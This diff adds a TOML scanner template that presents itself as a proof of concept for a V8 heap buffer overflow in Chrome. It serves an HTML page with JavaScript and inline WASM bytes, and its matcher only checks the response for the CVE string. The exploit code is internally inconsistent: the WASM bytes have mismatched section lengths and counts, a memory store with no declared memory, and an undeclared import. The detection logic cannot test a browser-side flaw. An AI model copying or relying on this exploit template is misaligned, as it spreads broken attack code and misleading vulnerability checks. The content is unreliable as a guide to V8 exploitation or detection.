@@ -1,0 +1,59 @@
+[info]
+author = "AVE"
+description = "通过构造特制的 HTML 页面加载恶意 WASM 模块，触发 V8 引擎在处理 WASM-to-JS 类型混淆时的堆缓冲区溢出，导致堆内存越界写入。成功利用可导致浏览器崩溃或远程代码执行。需配合 exploit-cve-2025-0999.wasm 文件使用。"
+id = "POC-AVE-2025-0421"
+name = "Google Chrome V8 堆缓冲区溢出漏洞 PoC"
+severity = "high"
+tags = [
+    "cve-2025-0999",
+    "v8",
+    "chrome",
+    "heap-buffer-overflow",
+    "wasm",
+]
+vuln_id = [
+    "CVE-2025-0999",
+    "AVE-2025-0421",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cve-2025-0999-poc.html"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<!DOCTYPE html>
+<html>
+<head><title>CVE-2025-0999 PoC</title></head>
+<body>
+<script>
+function jitWriteBuffer() {
+    function innerWrite(offset, size) {
+        let jsBuffer = new Uint8Array(2048);
+        jsBuffer[offset] = 0x41;
+        jsBuffer[offset + 1] = 0x41;
+        jsBuffer[offset + 2] = 0x41;
+        jsBuffer[offset + 3] = 0x41;
+    }
+    for (let i = 0; i < 10000; i++) innerWrite(0, 4);
+    return innerWrite;
+}
+const writeBuffer = jitWriteBuffer();
+const wasmBytes = new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,0,3,2,1,0,7,17,2,4,109,97,105,110,0,0,10,9,1,7,0,65,0,65,0,54,2,0,11]);
+const wasmModule = new WebAssembly.Module(wasmBytes);
+const instance = new WebAssembly.Instance(wasmModule, { env: { writeBuffer } });
+instance.exports.main();
+</script>
+</body>
+</html>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["CVE-2025-0999"]
